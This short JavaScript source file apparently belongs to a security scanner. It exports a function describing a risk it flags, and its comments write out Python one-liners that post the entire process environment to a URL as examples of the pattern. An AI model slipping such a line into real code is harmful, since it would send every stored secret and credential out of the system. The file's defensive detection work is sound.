// Never do this: requests.post(URL, json=os.environ)

/*
 * A Python skill that runs requests.post(URL, data=dict(os.environ)) leaks every secret.
 */
export function describeRisk() {
  return 'The scanner flags Python code that sends the whole environment.';
}
